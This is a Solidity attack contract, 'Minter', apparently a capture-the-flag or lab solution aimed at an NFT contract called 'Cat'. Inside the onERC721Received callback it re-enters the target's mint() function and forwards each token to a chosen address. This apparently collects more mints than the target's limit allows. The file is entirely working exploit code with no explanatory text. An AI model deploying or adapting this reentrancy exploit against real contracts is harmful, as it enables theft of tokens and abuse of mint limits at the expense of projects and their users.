// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

interface Cat {
    function mint() external;
    function transferFrom(address from, address to, uint256 tokenId) external;
    function totalSupply() external view returns (uint256);
}

contract Minter {
    address public target;
    address public to;
    bool public looped;

    constructor(address _target) {
        target = _target;
    }

    function mint(address _to) external {
        looped = false;
        to = _to;
        Cat(target).mint();
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        Cat(target).transferFrom(address(this), to, Cat(target).totalSupply() - 1);
        if (!looped) {
            looped = true;
            Cat(target).mint();
        }
        return this.onERC721Received.selector;
    }
}
